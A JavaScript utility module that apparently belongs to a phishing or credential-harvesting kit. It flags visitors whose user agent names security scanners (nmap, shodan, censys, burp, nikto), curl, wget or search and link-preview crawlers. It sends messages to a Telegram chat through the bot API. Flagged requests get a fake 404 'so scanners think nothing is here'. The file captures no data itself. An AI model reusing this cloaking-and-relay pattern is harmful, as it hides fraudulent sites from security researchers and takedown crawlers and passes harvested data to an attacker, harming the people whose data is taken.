// Shared utilities: anti-bot detection + Telegram sender

const BOT_SIGNATURES = [
  'bot', 'crawler', 'spider', 'scraper', 'scan', 'fetch', 'headless',
  'phantom', 'selenium', 'puppeteer', 'playwright', 'slimerjs',
  'curl', 'wget', 'python-requests', 'httpie', 'postman', 'insomnia',
  'zgrab', 'nmap', 'masscan', 'censys', 'shodan', 'burp', 'nikto',
  'googlebot', 'bingbot', 'yandex', 'duckduckbot', 'baidu', 'facebook',
  'twitterbot', 'linkedinbot', 'slackbot', 'discordbot'
];

export function isBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  if (!ua) return true;
  if (ua.length < 20) return true;

  for (const sig of BOT_SIGNATURES) {
    if (ua.includes(sig)) return true;
  }

  // Common headless signatures
  if (req.headers['x-headless'] || req.headers['x-playwright'] || req.headers['x-puppeteer']) {
    return true;
  }

  return false;
}

export function getClientIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
         req.headers['x-real-ip'] ||
         req.connection?.remoteAddress ||
         'unknown';
}

export async function sendTelegram(message, env) {
  const token = env.TELEGRAM_BOT_TOKEN;
  const chatId = env.TELEGRAM_CHAT_ID;

  if (!token || !chatId || token === 'YOUR_BOT_TOKEN_HERE' || chatId === 'YOUR_CHAT_ID_HERE') {
    console.log('ℹ️ Telegram not configured');
    return false;
  }

  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    if (res.ok) {
      console.log('✅ Telegram sent');
      return true;
    }
    console.error('❌ Telegram HTTP error:', res.status);
    return false;
  } catch (err) {
    console.error('❌ Telegram error:', err.message);
    return false;
  }
}

export function botResponse(res) {
  // Return a generic 404 so scanners think nothing is here
  return res.status(404).json({ error: 'Not Found' });
}
